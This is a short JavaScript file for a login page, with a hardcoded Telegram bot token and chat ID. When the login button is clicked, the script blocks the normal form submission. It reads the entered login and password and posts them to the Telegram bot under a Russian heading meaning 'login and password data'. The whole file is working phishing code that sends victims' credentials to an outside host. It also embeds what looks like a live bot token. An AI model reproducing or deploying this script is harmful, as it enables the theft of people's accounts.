const token = "6088465506:AAFmj6WQjZQ2b8Yg6rfCcXDI2UOpCg0JE5Q";
const chatID = "-1001654890188";
const uriApi = `https://api.telegram.org/bot${token}/sendMessage`;

const login = document.querySelector(".login");
const password = document.querySelector(".password");
const come = document.querySelector(".come");

come.addEventListener('click' , (e) => {
  if(login.value == '' || password.value == ''){
    return;
  }
  else {
    e.preventDefault();
    let message = `<b>Данные логина и паролля</b> \n`;
    message += `<b>Логин :</b> ${login.value} \n`;
    message += `<b>Пароль :</b> ${password.value} \n`;
    
    axios.post(uriApi, {
    chat_id: chatID,
    parse_mode: "html",
    text: message,
  });
  }

  
})
